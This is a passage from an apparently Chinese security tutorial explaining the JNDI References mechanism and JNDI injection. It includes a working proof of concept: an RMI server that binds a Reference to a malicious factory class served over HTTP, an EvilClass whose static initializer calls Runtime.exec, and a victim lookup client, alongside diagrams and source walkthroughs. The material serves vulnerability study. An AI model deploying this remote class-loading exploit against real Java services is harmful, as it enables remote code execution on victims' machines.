&lt;code&gt;obj&lt;/code&gt; 为 null，则创建一个用于解析与该工厂关联的</span></span><br><span class="line"><span class="comment">     *       scheme 的上下文。生成的上下文不绑定到某个具体 URL：</span></span><br><span class="line"><span class="comment">     *       它能够处理任意该工厂 scheme 的 URL。</span></span><br><span class="line"><span class="comment">     *       例如：对 LDAP URL 上下文工厂以 &lt;code&gt;obj&lt;/code&gt; 为 null 调用</span></span><br><span class="line"><span class="comment">     *       &lt;tt&gt;getObjectInstance()&lt;/tt&gt;，应返回一个可解析 LDAP URL 的上下文，</span></span><br><span class="line"><span class="comment">     *       如 &quot;ldap://ldap.wiz.com/o=wiz,c=us&quot; 和</span></span><br><span class="line"><span class="comment">     *       &quot;ldap://ldap.umich.edu/o=umich,c=us&quot;。&lt;/li&gt;</span></span><br><span class="line"><span class="comment">     *   &lt;li&gt;如果 &lt;code&gt;obj&lt;/code&gt; 是一个 URL 字符串，则创建由该 URL 标识的对象</span></span><br><span class="line"><span class="comment">     *       （通常为一个上下文）。例如：若这是一个 LDAP URL 上下文工厂，</span></span><br><span class="line"><span class="comment">     *       而 &lt;code&gt;obj&lt;/code&gt; 为 &quot;ldap://ldap.wiz.com/o=wiz,c=us&quot;，</span></span><br><span class="line"><span class="comment">     *       则 &lt;tt&gt;getObjectInstance()&lt;/tt&gt; 应返回位于 LDAP 服务器</span></span><br><span class="line"><span class="comment">     *       ldap.wiz.com 上、以可分辨名 &quot;o=wiz, c=us&quot; 命名的上下文。</span></span><br><span class="line"><span class="comment">     *       随后可用该上下文来解析相对该上下文的 LDAP 名称（如 &quot;cn=George&quot;）。&lt;/li&gt;</span></span><br><span class="line"><span class="comment">     *   &lt;li&gt;如果 &lt;code&gt;obj&lt;/code&gt; 是一个 URL 字符串数组，假定这些 URL</span></span><br><span class="line"><span class="comment">     *       在它们所指向的上下文方面是等价的。是否需要以及如何验证等价性，</span></span><br><span class="line"><span class="comment">     *       由上下文工厂自行决定。数组中 URL 的顺序并不重要。</span></span><br><span class="line"><span class="comment">     *       &lt;tt&gt;getObjectInstance()&lt;/tt&gt; 返回的对象与“单个 URL 情况”类似：</span></span><br><span class="line"><span class="comment">     *       即由这些 URL 命名的那个对象。&lt;/li&gt;</span></span><br><span class="line"><span class="comment">     *   &lt;li&gt;如果 &lt;code&gt;obj&lt;/code&gt; 是其他类型，那么</span></span><br><span class="line"><span class="comment">     *       &lt;tt&gt;getObjectInstance()&lt;/tt&gt; 的行为由该上下文工厂的实现决定。&lt;/li&gt;</span></span><br><span class="line"><span class="comment">     * &lt;/ol&gt;</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * &lt;p&gt;</span></span><br><span class="line"><span class="comment">     * &lt;tt&gt;name&lt;/tt&gt; 与 &lt;tt&gt;environment&lt;/tt&gt; 参数的所有权属于调用方。</span></span><br><span class="line"><span class="comment">     * 实现不得修改这些对象或长期持有它们的引用，但可以保存其副本或克隆。</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * &lt;p&gt;</span></span><br><span class="line"><span class="comment">     * &lt;b&gt;Name 与 Context 参数。&lt;/b&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;</span></span><br><span class="line"><span class="comment">     * &lt;a name=&quot;NAMECTX&quot;&gt;&lt;/a&gt;</span></span><br><span class="line"><span class="comment">     * &lt;br&gt;</span></span><br><span class="line"><span class="comment">     * 可以选择性地使用 &lt;code&gt;name&lt;/code&gt; 与 &lt;code&gt;nameCtx&lt;/code&gt;</span></span><br><span class="line"><span class="comment">     * 来指定所创建对象的名称。</span></span><br><span class="line"><span class="comment">     * &lt;code&gt;name&lt;/code&gt; 是相对于 &lt;code&gt;nameCtx&lt;/code&gt; 的名称。</span></span><br><span class="line"><span class="comment">     * 如果对象可能从多个上下文被命名（这很常见），由调用方选择其中之一。</span></span><br><span class="line"><span class="comment">     * 一个经验法则是选择可用的“最深层”上下文。</span></span><br><span class="line"><span class="comment">     * 如果 &lt;code&gt;nameCtx&lt;/code&gt; 为 null，则 &lt;code&gt;name&lt;/code&gt; 相对于默认初始上下文。</span></span><br><span class="line"><span class="comment">     * 如果不指定名称，则 &lt;code&gt;name&lt;/code&gt; 应为 null。</span></span><br><span class="line"><span class="comment">     * 如果工厂需要使用 &lt;code&gt;nameCtx&lt;/code&gt;，应在并发访问时对其使用进行同步，</span></span><br><span class="line"><span class="comment">     * 因为上下文实现不保证线程安全。</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> obj 可能为 null；包含可用于创建对象的位置或引用信息</span></span><br><span class="line"><span class="comment">     *            （例如 &#123;<span class="doctag">@link</span> javax.naming.Reference&#125;）。</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> name 该对象相对于 &lt;code&gt;nameCtx&lt;/code&gt; 的名称；如未指定则为 null。</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> nameCtx &lt;code&gt;name&lt;/code&gt; 所相对的上下文；若 &lt;code&gt;name&lt;/code&gt;</span></span><br><span class="line"><span class="comment">     *                相对于默认初始上下文，则为 null。</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> environment 可能为 null；用于创建对象的环境属性集合。</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span> 创建的对象；若无法创建则返回 null。</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@throws</span> Exception 当本对象工厂在尝试创建对象时遇到异常，且不应再尝试其他工厂时抛出。</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@see</span> NamingManager#getObjectInstance</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@see</span> NamingManager#getURLContext</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    Object <span class="title function_">getObjectInstance</span><span class="params">(Object obj, Name name, Context nameCtx,</span></span><br><span class="line"><span class="params">                             Hashtable&lt;?, ?&gt; environment)</span> <span class="keyword">throws</span> Exception;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>该接口之后一个方法 <code>getObjectInstance</code>，这个方法的作用是根据给定的位置或引用信息创建一个对象。</p>
<p>这里我们使用的 <code>EchoFactory</code> 是 <code>ObjectFactory</code> 接口的实现类，其中的 <code>getObjectInstance</code> 方法会根据我们传入的参数拼接一个字符串返回。</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 文件：EchoFactory.java</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.naming.*;</span><br><span class="line"><span class="keyword">import</span> javax.naming.spi.ObjectFactory;</span><br><span class="line"><span class="keyword">import</span> java.util.Arrays;</span><br><span class="line"><span class="keyword">import</span> java.util.Hashtable;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">EchoFactory</span> <span class="keyword">implements</span> <span class="title class_">ObjectFactory</span> &#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> Object <span class="title function_">getObjectInstance</span><span class="params">(Object obj, Name name, Context nameCtx, Hashtable&lt;?, ?&gt; env)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="keyword">if</span> (!(obj <span class="keyword">instanceof</span> Reference)) <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">        <span class="type">Reference</span> <span class="variable">ref</span> <span class="operator">=</span> (Reference) obj;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 读取字符串参数：StringRefAddr(&quot;greeting&quot;, &quot;hello-ctf&quot;)</span></span><br><span class="line">        <span class="type">String</span> <span class="variable">greeting</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">        <span class="type">RefAddr</span> <span class="variable">g</span> <span class="operator">=</span> ref.get(<span class="string">&quot;greeting&quot;</span>);              <span class="comment">// 按“类型名”取</span></span><br><span class="line">        <span class="keyword">if</span> (g <span class="keyword">instanceof</span> StringRefAddr) &#123;</span><br><span class="line">            greeting = (String) g.getContent();       <span class="comment">// -&gt; &quot;hello-ctf&quot;</span></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 读取二进制参数：BinaryRefAddr(&quot;nonce&quot;, new byte[]&#123;1,2,3,4&#125;)</span></span><br><span class="line">        <span class="type">byte</span>[] nonce = <span class="literal">null</span>;</span><br><span class="line">        <span class="type">RefAddr</span> <span class="variable">n</span> <span class="operator">=</span> ref.get(<span class="string">&quot;nonce&quot;</span>);</span><br><span class="line">        <span class="keyword">if</span> (n != <span class="literal">null</span> &amp;&amp; n.getContent() <span class="keyword">instanceof</span> <span class="type">byte</span>[]) &#123;</span><br><span class="line">            nonce = (<span class="type">byte</span>[]) n.getContent();          <span class="comment">// -&gt; [1,2,3,4]</span></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 返回“最终对象”（演示用，真实场景可返回任意类型）</span></span><br><span class="line">        <span class="keyword">return</span> String.format(<span class="string">&quot;EchoFactory -&gt; greeting=%s, nonce=%s&quot;</span>,</span><br><span class="line">                greeting, Arrays.toString(nonce));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>由于前面 <code>factoryLocation</code> 设置为 <code>http://localhost:8000/</code> 且我们确保本地 classpath 下没有 <code>EchoFactory</code> 的类文件。因此 JNDI 会尝试从 <code>factoryLocation</code> 设置的 URL 远程加载类。</p>
<p>我们需要 <code>python3 -m http.server</code> 在 <code>EchoFactory.java</code> 编译生成的 <code>EchoFactory.class</code> 目录下开启 HTTP 服务监听 8000 端口，这样 <code>EchoFactory</code> 类才会被成功加载。</p>
<hr>
<p>JNDI References 机制的总体流程如下所示：</p>
<pre class="mermaid">sequenceDiagram
    autonumber

    %% ── 参与方分组（带背景色） ──
    box rgb(230,242,255) 客户端（进程）
      participant C as Client 应用 💻
      participant NM as NamingManager 🧠
      participant VH as URLClassLoader / Helper 📚
      participant CP as 本地类路径 🧱
    end

    box rgb(232,245,233) 目录服务（远程/本地）
      participant R as RMI / LDAP 服务 📇
      participant LC as 本地 Context（java:...）🔧
    end

    box rgb(255,243,224) 远程代码库（可选）
      participant H as HTTP 服务器 🌐
    end

    box rgb(252,228,236) 工厂实现
      participant OF as EchoFactory（ObjectFactory）🧪
    end

    %% ── 引用获取：远程 & 本地 ──
    alt 远程引用（RMI / LDAP）🌐
      C->>R: lookup("rmi://.../hello" 或 "ldap://.../name") 🔍
      R-->>C: 返回 Reference 🗂️（className/factory/factoryLocation/RefAddr）
    else 本地引用（进程内）🧩
      C->>LC: lookup("java:comp/env/...") 🔍
      LC-->>C: 返回 Reference 🗂️
    end

    %% ── 解析 Reference → 生成最终对象 ──
    C->>NM: getObjectInstance(Reference) ▶️
    NM->>NM: 读取 factoryClassName / factoryLocation / RefAddr 🔎

    alt 指定了 factoryClassName（如 "EchoFactory"）🧭
      %% ── 路径 A：本地可加载 ──
      alt 在本地 Classpath 可找到工厂类 ✅
        NM->>VH: loadClass("EchoFactory")（本地）
        VH->>CP: 查找 EchoFactory.class
        CP-->>VH: class bytes 📦
        VH-->>NM: Class EchoFactory
        NM->>OF: newInstance() + getObjectInstance(ref, name, ctx, env)
        OF-->>C: 返回“最终对象” 🎯
      else 本地找不到工厂类 ❓
        %% ── 路径 B：远程 codebase（需开启） ──
        alt trustURLCodebase == true 🔓
          NM->>VH: 以 factoryLocation 构造 URLClassLoader
          opt 目录 vs JAR 判定
            note right of VH: 以 "/" 结尾 → 目录：请求 /EchoFactory.class 📄<br/>非 "/" 且指向 .jar → 请求 /evil.jar 🧴
          end
          VH->>H: HTTP GET（class 或 jar）
          H-->>VH: 200 OK（class/jar 字节）📦
          VH-->>NM: Class EchoFactory
          NM->>OF: newInstance() + getObjectInstance(...)
          OF-->>C: 返回“最终对象” 🎯
        else trustURLCodebase == false 🔒 或下载失败 🚫
          NM-->>C: 解析失败（可能返回原始 Reference 或抛异常）⚠️
        end
      end
    else 未指定 factoryClassName（走内置/环境工厂）🧩
      NM->>NM: 尝试 URLContextFactory 等内置工厂
      NM-->>C: 返回对象或失败 🎛️
    end</pre>

<h2 id="JNDI-References-注入"><a href="#JNDI-References-注入" class="headerlink" title="JNDI References 注入"></a>JNDI References 注入</h2><p><strong>JNDI References 注入</strong>就是在 RMI&#x2F;LDAP 等目录服务里挂一个 <code>Reference</code>。当受害端 <code>lookup()</code> 取到它后，JNDI 会走 <code>NamingManager.getObjectInstance()</code> → 找到 <code>ObjectFactory</code> → 调用 <code>getObjectInstance()</code> 返回最终对象。如果这一步能<strong>加载恶意工厂类</strong>或<strong>调用危险的本地工厂类</strong>，就能实现命令执行&#x2F;任意代码执行。</p>
<h3 id="JNDI-RMI"><a href="#JNDI-RMI" class="headerlink" title="JNDI-RMI"></a>JNDI-RMI</h3><h4 id="远程类加载（8u121、7u131、6u141-前）"><a href="#远程类加载（8u121、7u131、6u141-前）" class="headerlink" title="远程类加载（8u121、7u131、6u141 前）"></a>远程类加载（8u121、7u131、6u141 前）</h4><p>首先服务端的 <code>Reference</code> 设置工厂类为恶意类，并将 <code>Reference</code> 注册到 RMI 注册中心。</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> javax.naming.Reference;</span><br><span class="line"><span class="keyword">import</span> com.sun.jndi.rmi.registry.ReferenceWrapper;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.LocateRegistry;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">RMIServer</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">int</span> <span class="variable">PORT</span> <span class="operator">=</span> <span class="number">1099</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">Reference</span> <span class="variable">ref</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Reference</span>(</span><br><span class="line">                <span class="literal">null</span>,                        <span class="comment">// 目标类名（可为 null；JNDI 实际上更看重 factory）</span></span><br><span class="line">                <span class="string">&quot;EvilClass&quot;</span>,                 <span class="comment">// 工厂类（必须实现 javax.naming.spi.ObjectFactory）</span></span><br><span class="line">                <span class="string">&quot;http://localhost:8000/&quot;</span>     <span class="comment">// 工厂位置（现代 JDK 默认不信任远程 URL）</span></span><br><span class="line">        );</span><br><span class="line"></span><br><span class="line">        <span class="comment">// RMI 注册中心不接受普通对象，需用 ReferenceWrapper 适配为 Remote</span></span><br><span class="line">        <span class="type">ReferenceWrapper</span> <span class="variable">wrapped</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ReferenceWrapper</span>(ref);</span><br><span class="line">        </span><br><span class="line">        System.out.println(<span class="string">&quot;[*] RMI listening on 0.0.0.0:&quot;</span> + PORT);</span><br><span class="line">        LocateRegistry.createRegistry(PORT).rebind(<span class="string">&quot;exploit&quot;</span>, wrapped);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>


  <div class="note-large red">
    <div class="notel-title rounded-t-lg p-3 font-bold text-lg flex flex-row gap-2 items-center">
      <p>注意</p>

    </div>
    <div class="notel-content markdown-body">
      <p>恶意类最好和普通的工厂类一样实现 <code>javax.naming.spi.ObjectFactory</code> 接口，并重写 <code>getObjectInstance</code> 方法，否则在某些情况下客户端请求得到字节码文件后，会抛出异常。</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> javax.naming.Context;</span><br><span class="line"><span class="keyword">import</span> javax.naming.Name;</span><br><span class="line"><span class="keyword">import</span> javax.naming.spi.ObjectFactory;</span><br><span class="line"><span class="keyword">import</span> java.util.Hashtable;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">EvilClass</span> <span class="keyword">implements</span> <span class="title class_">ObjectFactory</span> &#123;</span><br><span class="line">    <span class="keyword">static</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            Runtime.getRuntime().exec(<span class="string">&quot;calc&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> Object <span class="title function_">getObjectInstance</span><span class="params">(Object obj, Name name, Context nameCtx, Hashtable&lt;?, ?&gt; environment)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

    </div>
  </div>

<p>只要能让客户端通过 JNDI 请求我们注册在 RMI 上的 <code>Reference</code> 类，就可能触发远程代码执行（RCE）。这正是 <strong>JNDI 注入</strong> 的典型利用方式（如 Log4Shell）。</p>

  <div class="note-large blue">
    <div class="notel-title rounded-t-lg p-3 font-bold text-lg flex flex-row gap-2 items-center">
      <p>提示</p>

    </div>
    <div class="notel-content markdown-body">
      <p>因为 RMI 远程调用只是起到了获取 <code>Reference</code> 对象的作用，真正类加载是 JNDI 的 References 机制，并没有 RMI 的参与。因此这里远程类加载的支持版本比纯 RMI 要高。</p>

    </div>
  </div>

<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> javax.naming.Context;</span><br><span class="line"><span class="keyword">import</span> javax.naming.InitialContext;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Client</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">Context</span> <span class="variable">ctx</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InitialContext</span>();</span><br><span class="line">        <span class="type">Object</span> <span class="variable">obj</span> <span class="operator">=</span> ctx.lookup(<span class="string">&quot;rmi://localhost:1099/exploit&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>整个攻击过程如下图所示：</p>
<pre class="mermaid">sequenceDiagram
    autonumber

    %% ── 分组：客户端 ──
    box rgb(230,242,255) 客户端（进程）
      participant App as Client 应用 💻
      participant IC as InitialContext
      participant GUC as GenericURLContext
      participant RC as RegistryContext
      participant NM as NamingManager 🧠
      participant VH as VersionHelper / URLClassLoader 📚
    end

    %% ── 分组：RMI 注册中心 ──
    box rgb(232,245,233) RMI 注册中心（服务端）
      participant Reg as RMI Registry 📇
      participant RW as ReferenceWrapper 服务端 📦
    end

    %% ── 分组：远程代码库（可选） ──
    box rgb(255,243,224) 代码库服务器
      participant HTTP as HTTP Codebase 🌐
    end

    %% 1) 客户端发起 JNDI 查找 → 取到 Reference
    App->>IC: lookup rmi://localhost:1099/exploit
    IC->>GUC: parse rmi URL
    GUC->>RC: delegate RegistryContext.lookup
    RC->>Reg: Registry.lookup exploit
    Reg-->>RC: ReferenceWrapper_Stub (RemoteReference)
    RC->>RW: getReference via RMI
    RW-->>RC: Reference factory=EvilClass codebase=http://localhost:8000/
    RC->>NM: NamingManager.getObjectInstance

    %% 2) 仅远程 codebase 加载 + 实例化（不画本地分支）
    alt trustURLCodebase true 🔓
      NM->>VH: helper.loadClass EvilClass http://localhost:8000/
      note right of VH: directory GET /EvilClass.class or jar GET /evil.jar
      VH->>HTTP: HTTP GET
      HTTP-->>VH: 200 OK bytes 📦
      VH-->>NM: Class EvilClass
      note right of NM: CLINIT static init may execute code (e.g. Runtime.exec)
      NM->>NM: instantiate factory (constructor runs)
      NM-->>App: factory loaded and instantiated ✅
    else trustURLCodebase false 🔒
      NM-->>App: remote codebase disabled, cannot load ⚠️
    end</pre>

<p>调用堆栈如下：</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">at java.lang.Runtime.exec(Runtime.java:347)</span><br><span class="line">at EvilClass.&lt;clinit&gt;(EvilClass.java:4)</span><br><span class="line">at java.lang.Class.forName0(Class.java:-1)</span><br><span class="line">at java.lang.Class.forName(Class.java:348)</span><br><span class="line">at com.sun.naming.internal.VersionHelper12.loadClass(VersionHelper12.java:72)</span><br><span class="line">at com.sun.naming.internal.VersionHelper12.loadClass(VersionHelper12.java:87)</span><br><span class="line">at javax.naming.spi.NamingManager.getObjectFactoryFromReference(NamingManager.java:158)</span><br><span class="line">at javax.naming.spi.NamingManager.getObjectInstance(NamingManager.java:319)</span><br><span class="line">at com.sun.jndi.rmi.registry.RegistryContext.decodeObject(RegistryContext.java:464)</span><br><span class="line">at com.sun.jndi.rmi.registry.RegistryContext.lookup(RegistryContext.java:124)</span><br><span class="line">at com.sun.jndi.toolkit.url.GenericURLContext.lookup(GenericURLContext.java:205)</span><br><span class="line">at javax.naming.InitialContext.lookup(InitialContext.java:417)</span><br><span class="line">at org.example.Client.main(Client.java:10)</span><br></pre></td></tr></table></figure></div>

<p>首先在 <code>RegistryContext#lookup</code> 方法中，会先通过 <code>RegistryImpl_Stub</code> 的 <code>lookup</code> 方法去查找 <code>rmi://localhost:1099/exploit</code> 对应的对象，服务端返回 <code>ReferenceWrapper_Stub</code> 对象，接着调用 <code>RegistryContext#decodeObject</code> 去获取信息</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * JNDI URL 解析链路（对应堆栈）：</span></span><br><span class="line"><span class="comment"> * InitialContext.lookup(String)</span></span><br><span class="line"><span class="comment"> *   → GenericURLContext.lookup(String)</span></span><br><span class="line"><span class="comment"> *     → RegistryContext.lookup(Name)   ← 本方法</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * 语义：在 RMI 注册表命名空间中解析给定 Name。</span></span><br><span class="line"><span class="comment"> * - 先用第 0 个分量到 Registry 取回“原始绑定对象”（可能是 Remote stub、ReferenceWrapper/Reference 等），</span></span><br><span class="line"><span class="comment"> * - 再将其“解码”为最终可用的 JNDI 对象（可能触发 ObjectFactory）。</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> Object <span class="title function_">lookup</span><span class="params">(Name name)</span> <span class="keyword">throws</span> NamingException &#123;</span><br><span class="line">    <span class="comment">// ① 空名：按 JNDI 规范返回“当前上下文”</span></span><br><span class="line">    <span class="comment">//    此处返回一个指向同一注册表根的 RegistryContext，供后续相对名解析。</span></span><br><span class="line">    <span class="keyword">if</span> (name.isEmpty()) &#123;</span><br><span class="line">        <span class="keyword">return</span> (<span class="keyword">new</span> <span class="title class_">RegistryContext</span>(<span class="built_in">this</span>));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    Remote obj; <span class="comment">// 将接收从 RMI Registry 取回的“原始对象”（Remote/Reference 等）</span></span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="comment">// ② RMI Registry 是扁平命名空间：仅使用名称的第 0 个分量作为绑定名</span></span><br><span class="line">        <span class="comment">//    等价调用：RegistryImpl_Stub.lookup(name.get(0))</span></span><br><span class="line">        <span class="comment">//    其中 registry 是 Registry 接口的远程存根：</span></span><br><span class="line">        <span class="comment">//    RegistryImpl_Stub[UnicastRef(liveRef→endpoint=host:1099, objID=REGISTRY_ID)]</span></span><br><span class="line">        obj = registry.lookup(name.get(<span class="number">0</span>));</span><br><span class="line"></span><br><span class="line">    &#125; <span class="keyword">catch</span> (NotBoundException e) &#123;</span><br><span class="line">        <span class="comment">// ③ 未绑定该名字（RMI 语义）→ 转换为 JNDI 的 NameNotFoundException</span></span><br><span class="line">        <span class="keyword">throw</span> (<span class="keyword">new</span> <span class="title class_">NameNotFoundException</span>(name.get(<span class="number">0</span>)));</span><br><span class="line"></span><br><span class="line">    &#125; <span class="keyword">catch</span> (RemoteException e) &#123;</span><br><span class="line">        <span class="comment">// ④ 远程通信/序列化等异常：包装成 NamingException 抛出（保持 JNDI 异常语义）</span></span><br><span class="line">        <span class="keyword">throw</span> (NamingException) wrapRemoteException(e).fillInStackTrace();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// ⑤ 解码原始对象为最终 JNDI 对象：</span></span><br><span class="line">    <span class="comment">//    - 若为 Reference / Referenceable：</span></span><br><span class="line">    <span class="comment">//        调用 NamingManager.getObjectInstance(ref, namePrefix, this, env)</span></span><br><span class="line">    <span class="comment">//        → 可能触发 ObjectFactory#getObjectInstance(...)</span></span><br><span class="line">    <span class="comment">//        → 若本地 classpath 有工厂类则本地加载；</span></span><br><span class="line">    <span class="comment">//          否则在 trustURLCodebase=true 时按 factoryLocation 远程加载（新 JDK 默认禁用）。</span></span><br><span class="line">    <span class="comment">//    - 若为 Remote 存根：可能直接返回或做适配（实现相关）。</span></span><br><span class="line">    <span class="comment">//</span></span><br><span class="line">    <span class="comment">//    这里传入 name.getPrefix(1)（已解析的前缀，仅第 0 分量），</span></span><br><span class="line">    <span class="comment">//    作为“对象名”上下文，供解码/工厂参考。</span></span><br><span class="line">    <span class="keyword">return</span> (decodeObject(obj, name.getPrefix(<span class="number">1</span>)));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>在 <code>RegistryContext#decodeObject</code> 方法，如果我们获取的远程对象是 <code>RemoteReference</code> 的实现类，则会调用该远程对象的 <code>getReference</code> 方法来获取真正的对象。</p>
